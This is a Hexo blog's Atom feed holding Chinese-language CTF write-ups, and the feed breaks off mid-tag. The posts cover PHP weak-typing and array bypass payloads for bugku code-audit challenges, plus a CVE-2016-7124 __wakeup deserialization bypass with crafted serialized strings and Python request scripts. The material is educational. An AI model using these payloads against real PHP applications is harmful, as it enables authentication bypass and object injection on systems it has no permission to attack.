<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kage&#39;s Blog</title>
  
  <subtitle>Kage&#39;s Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-05-13T12:50:25.422Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Kage</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计相关函数分析</title>
    <link href="http://yoursite.com/2019/05/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/05/13/代码审计的相关函数分析/</id>
    <published>2019-05-13T12:49:18.000Z</published>
    <updated>2019-05-13T12:50:25.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-GET"><a href="#0x01-GET" class="headerlink" title="0x01. \$_GET"></a>0x01. \$_GET</h2><p>$_GET函数经常是ctf解题入口，该函数可以传递数组<br>get.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_GET);</span><br></pre></td></tr></table></figure></p><p>(1) 传递多个值优先选择后一个值<br><img src="/img/1557406692081.png" alt="Alt text"><br>(2) 传递数组<br><img src="/img/1557406781122.png" alt="Alt text"><br>(3) array&gt;数字</p><p>附：$_POST同样有效</p><h2 id="0x02-extract"><a href="#0x02-extract" class="headerlink" title="0x02. extract"></a>0x02. extract</h2><p>将键名摘取为变量值，键值作为变量值</p><h2 id="0x03-strcmp"><a href="#0x03-strcmp" class="headerlink" title="0x03. strcmp"></a>0x03. strcmp</h2><p>传入数组返回Null</p><h2 id="0x04-strpos"><a href="#0x04-strpos" class="headerlink" title="0x04. strpos"></a>0x04. strpos</h2><p>传入数组返回null</p><h2 id="0x05-ereg"><a href="#0x05-ereg" class="headerlink" title="0x05. ereg"></a>0x05. ereg</h2><p>传入数组返回null</p><h2 id="0x06-is-numeric"><a href="#0x06-is-numeric" class="headerlink" title="0x06. is_numeric"></a>0x06. is_numeric</h2><p>可以传入<code>&#39;数字+字母&#39;</code>绕过判断，如<code>&#39;123a&#39;</code>比较可被当成数字，即<code>&#39;123a&#39;&gt;&#39;123&#39;</code></p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07. {}"></a>0x07. {}</h2><p>选取字符串中的字符可用{}进行选取，如\$str = ‘abc’，那么$str{1}即为a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-GET&quot;&gt;&lt;a href=&quot;#0x01-GET&quot; class=&quot;headerlink&quot; title=&quot;0x01. \$_GET&quot;&gt;&lt;/a&gt;0x01. \$_GET&lt;/h2&gt;&lt;p&gt;$_GET函数经常是ctf解题入口，该函数可以传递数组&lt;br&gt;get.php
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>bugku代码审计wp</title>
    <link href="http://yoursite.com/2019/05/13/bugku%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1wp/"/>
    <id>http://yoursite.com/2019/05/13/bugku代码审计wp/</id>
    <published>2019-05-13T12:44:23.000Z</published>
    <updated>2019-05-13T12:44:46.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-extract变量覆盖"><a href="#0x01-extract变量覆盖" class="headerlink" title="0x01. extract变量覆盖"></a>0x01. extract变量覆盖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$flag=&apos;xxx&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line">if($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;flag&#123;xxx&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;Oh.no&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>\$shiyan和$flag变量由<code>extract</code>变量覆盖进行控制<br>$content变量由<code>file_get_contents</code>函数通过<code>php://input</code>进行控制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/1.php?shiyan=1&amp;flag=php://input</span><br><span class="line">1</span><br></pre></td></tr></table></figure></p><h2 id="0x02-strcmp比较字符串"><a href="#0x02-strcmp比较字符串" class="headerlink" title="0x02. strcmp比较字符串"></a>0x02. strcmp比较字符串</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;No&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>strcmp</code>函数遇到数组后，会出错返回null，而<code>null==0</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/6.php?a[]</span><br></pre></td></tr></table></figure></p><h2 id="0x03-urldecode二次编码绕过"><a href="#0x03-urldecode二次编码绕过" class="headerlink" title="0x03. urldecode二次编码绕过"></a>0x03. urldecode二次编码绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line"></span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line">Access granted!</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二次编码绕过</p><h2 id="0x04-md5-函数"><a href="#0x04-md5-函数" class="headerlink" title="0x04. md5()函数"></a>0x04. md5()函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (isset($_GET[&apos;username&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">print &apos;Your password can not be your username.&apos;;</span><br><span class="line">else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入数组绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p><h2 id="0x05-数组返回NULL绕过"><a href="#0x05-数组返回NULL绕过" class="headerlink" title="0x05. 数组返回NULL绕过"></a>0x05. 数组返回NULL绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">echo &apos;You password must be alphanumeric&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ereg传入数组返回null，strpos传入数组返回null<br>paload: ?password[]</p><h2 id="0x06-弱类型整数大小比较绕过"><a href="#0x06-弱类型整数大小比较绕过" class="headerlink" title="0x06. 弱类型整数大小比较绕过"></a>0x06. 弱类型整数大小比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure><p>传入’1337a’可以绕过is_numeric</p><h2 id="0x07-sha-函数比较绕过"><a href="#0x07-sha-函数比较绕过" class="headerlink" title="0x07. sha()函数比较绕过"></a>0x07. sha()函数比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[&apos;name&apos;]);</span><br><span class="line">echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">var_dump($_GET[&apos;password&apos;]);</span><br><span class="line">var_dump(sha1($_GET[&apos;name&apos;]));</span><br><span class="line">var_dump(sha1($_GET[&apos;password&apos;]));</span><br><span class="line">if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">Your password can not be your name!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Invalid password.</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Login first!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br></pre></td></tr></table></figure><p>哈希算法，传入数组返回null<br>payload:?name[]=1&amp;password[]=2</p><h2 id="0x08-md5加密相等绕过"><a href="#0x08-md5加密相等绕过" class="headerlink" title="0x08. md5加密相等绕过"></a>0x08. md5加密相等绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$md51 = md5(&apos;QNKCDZO&apos;);</span><br><span class="line">$a = @$_GET[&apos;a&apos;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo &quot;flag&#123;*&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br></pre></td></tr></table></figure><p>QNKCDZO的哈希值为0e830400451993494058024219903391<br>s878926199a的哈希值为0e545993274517709034328855841020<br>php弱类型 ‘0e数字’ == ‘0e数字’<br>payload:?a=s878926199a</p><h2 id="0x09-十六进制与数字比较"><a href="#0x09-十六进制与数字比较" class="headerlink" title="0x09. 十六进制与数字比较"></a>0x09. 十六进制与数字比较</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">$one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">$nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">$number = &apos;3735929054&apos;;</span><br><span class="line">// Check all the input characters!</span><br><span class="line">for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line">if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">return &quot;flase&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($number == $temp)</span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">echo noother_says_correct($temp);</span><br></pre></td></tr></table></figure><p>ascii值在1~9过滤掉，而php弱类型比较 ‘16进制’ == ‘10进制’，可以绕过<br>paylaod:password=0xdeadc0de</p><h2 id="0x10-ereg正则-00截断"><a href="#0x10-ereg正则-00截断" class="headerlink" title="0x10. ereg正则%00截断"></a>0x10. ereg正则%00截断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">You password must be alphanumeric</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET[&apos;password&apos;], &apos;-&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo(&apos;</span><br><span class="line">- have not been found</span><br><span class="line"></span><br><span class="line">&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;</span><br><span class="line">Invalid password</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用数组&gt;数字，并且ereg和strlen和strpos传入数组均为null可以绕过<br>payload：?password[]</p><h2 id="0x11-strpos数组绕过"><a href="#0x11-strpos数组绕过" class="headerlink" title="0x11. strpos数组绕过"></a>0x11. strpos数组绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&apos;ctf&apos;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE)</span><br><span class="line">echo &apos;必须输入数字才行&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;骚年，继续努力吧啊~&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老知识点，ereg和strpos传入数组返回null可以绕过<br>paylaod: ?ctf[]</p><h2 id="0x12-数字验证正则绕过"><a href="#0x12-数字验证正则绕过" class="headerlink" title="0x12.  数字验证正则绕过"></a>0x12.  数字验证正则绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码题意，进行绕过<br>payload: password=42.000000000000e-0    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-extract变量覆盖&quot;&gt;&lt;a href=&quot;#0x01-extract变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;0x01. extract变量覆盖&quot;&gt;&lt;/a&gt;0x01. extract变量覆盖&lt;/h2&gt;&lt;figure class=&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化绕过__wakeup方法</title>
    <link href="http://yoursite.com/2019/04/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87__wakeup%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2019/04/21/PHP反序列化绕过__wakeup方法/</id>
    <published>2019-04-21T10:12:23.000Z</published>
    <updated>2019-05-13T12:45:05.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01.前言"></a>0x01.前言</h2><p>做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。<br>影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p><h2 id="0x02-public-private-protected的序列化"><a href="#0x02-public-private-protected的序列化" class="headerlink" title="0x02. public private protected的序列化"></a>0x02. public private protected的序列化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Kage&#123;</span><br><span class="line">public $name=&apos;kxj&apos;;</span><br><span class="line">private $name2=&apos;kxj&apos;;</span><br><span class="line">protected $name3=&apos;kxj&apos;;</span><br><span class="line"></span><br><span class="line">public function getName()&#123;</span><br><span class="line">var_dump($this);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new Kage());</span><br><span class="line"></span><br><span class="line">$a = unserialize($_GET[&apos;id&apos;]);</span><br><span class="line">$a-&gt;getName();</span><br></pre></td></tr></table></figure><p>运行得到结果：<br><code>O:4:&quot;Kage&quot;:3:{s:5:&quot;name1&quot;;s:3:&quot;kxj&quot;;s:11:&quot;Kagename2&quot;;s:3:&quot;kxj&quot;;s:8:&quot;*name3&quot;;s:3:&quot;kxj&quot;;}</code><br>属性值都一样，不同的在属性名</p><ul><li>public：s:5:”name1”</li><li>private：s:11:”Kagename2”</li><li>protected：s:8:”*name3”</li></ul><p>细心观察，会发现private和protected方法长度与所标识的不一样，实际原因是因为浏览器或命令行无法输出某些字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/ctf/guosai/test/test.php&quot;</span><br><span class="line"></span><br><span class="line">h = requests.get(url).content</span><br><span class="line"></span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure></p><p>通过content输出可以发现<br><code>b&#39;O:4:&quot;Kage&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;kxj&quot;;s:11:&quot;\x00Kage\x00name2&quot;;s:3:&quot;kxj&quot;;s:8:&quot;\x00*\x00name3&quot;;s:3:&quot;kxj&quot;;}&#39;</code></p><ul><li>public：s:5:”name1”</li><li>private：s:11:”\x00Kage\x00name2”</li><li>protected：s:8:”\x00*\x00name3”</li></ul><p>研究可以发现，<code>public</code>修饰变量时原样保留，<code>private</code>修饰变量时为<code>\x00类名\x00变量名</code>，<code>protected</code>修饰变量时为<code>\x00*\x00变量</code>。</p><p>写脚本用<code>\x00</code>时会报错，可以使用<code>%00</code>或者<code>\0</code>来填充<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">p1 = &apos;O:4:&quot;Kage&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;s:11:&quot;%00Kage%00name2&quot;;s:4:&quot;flag&quot;;s:8:&quot;%00*%00name3&quot;;s:4:&quot;flag&quot;;&#125;&apos;</span><br><span class="line">p2 = &apos;O:4:&quot;Kage&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;s:11:&quot;\0Kage\0name2&quot;;s:4:&quot;flag&quot;;s:8:&quot;\0*\0name3&quot;;s:4:&quot;flag&quot;;&#125;&apos;</span><br><span class="line">url = &quot;http://127.0.0.1/ctf/guosai/test/test.php?id=&quot; + p2</span><br><span class="line"></span><br><span class="line">h = requests.get(url).content</span><br><span class="line"></span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure></p><p>结果将<code>kxj</code>改为了<code>flag</code><br><img src="/img/1555855975423.png" alt="Alt text"></p><h2 id="0x03-wakeup魔术方法绕过"><a href="#0x03-wakeup魔术方法绕过" class="headerlink" title="0x03. __wakeup魔术方法绕过"></a>0x03. __wakeup魔术方法绕过</h2><p>CVE-2016-7124：简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">private $file;</span><br><span class="line"></span><br><span class="line">public function __construct($file) &#123;</span><br><span class="line">$this-&gt;file = $file;</span><br><span class="line">&#125;</span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">echo $this-&gt;file;</span><br><span class="line">&#125;</span><br><span class="line">public function __wakeup() &#123;</span><br><span class="line">$this-&gt;file = NULL;</span><br><span class="line">echo &quot;wakeup&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// $s = new Test(&apos;index&apos;);</span><br><span class="line">// $g = serialize($s);</span><br><span class="line">// echo $g;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[&apos;id&apos;]);</span><br></pre></td></tr></table></figure></p><p>意思大概就是反序列化之后，会自动调用<code>__wakeup</code>方法将文件名设置为空。<br><code>O:4:&quot;Test&quot;:1:{s:10:&quot;%00Test%00file&quot;;s:4:&quot;flag&quot;;}</code><br><img src="/img/1555860027596.png" alt="Alt 